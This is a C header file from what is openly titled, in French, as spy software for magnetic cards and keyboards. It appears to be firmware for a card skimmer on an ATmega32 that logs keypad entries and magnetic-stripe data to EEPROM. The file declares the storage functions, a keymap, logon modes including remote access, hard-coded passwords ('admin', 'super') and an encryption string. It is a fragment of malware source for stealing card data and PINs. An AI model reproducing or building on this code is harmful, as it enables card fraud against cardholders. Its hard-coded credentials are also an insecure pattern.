/*************************************************************************************************************
 *    Titre	       : Logiciel d'espion pour carte magnétique et clavier.
 *    Fichier      : main.h
 **************************************************************************************************************/

/**************************************************************************************************************
 ** @file	main.h
 ** @brief	Fichier de déclarations pour le module principal.
 **************************************************************************************************************/
 
#ifndef __MAIN_H__
#define __MAIN_H__

/*************************************************************************************************************
	Définitions des constantes spécifiques à la version
*************************************************************************************************************/

/*************************************************************************************************************
 *    Version      : 7.4.0b
 *    Mise à jours : 20/11/2010
 *
 *    Options:
 *	  --------
 *    - ATMEGA32
 *    - Clavier #3
 *    - Touche 4A
 *    - RTC DS1337
 *    - I2CEEPROM 1024 x 2
 *    - FAUX END
 *
 *    Notes:
 *    ------
 *    - Corrigé les dépassements de I2CEEPROM
 *    - Ralentissement du scanning des touches
 **************************************************************************************************************/

/*************************************************************************************************************
	Définitions des constantes
*************************************************************************************************************/
#define	VERSION		"Ver.7.4.0"
#define	PASSL1		"admin"	
#define	PASSL2		"super"
#define	CRYPT		"jechasselesgibierspourbienmanger"
#define	CONNAME		"console"
#define	ENKEY		"4A"

#define	KEY0	'A'
#define	KEY1	'K'
#define	KEY2	'0'
#define	KEY3	'A'
#define	KEY4	0
#define	KEY5	'9'
#define	KEY6	'8'
#define	KEY7	'7'
#define	KEY8	0
#define	KEY9	'6'
#define	KEYA	'5'
#define	KEYB	'4'
#define	KEYC	0
#define	KEYD	'3'
#define	KEYE	'2'
#define	KEYF	'1'

#define END		'1'	// Vrai end = 0, Faux end = '1'

/************************************************************************************************************/

#define LOGOFF 0
#define LOGON 1
#define LOGON_REMOTE 2
#define LOGON_TEST 3

/*************************************************************************************************************
	Définition des variables globales
*************************************************************************************************************/
char enkey[4];
char keymap[17];
char kbdebug;

int kb_scan_slacker;

/*************************************************************************************************************
	Définition des fonctions
*************************************************************************************************************/
void write_kb_i2ceeprom(void);
void write_mag_i2ceeprom(void);

#endif
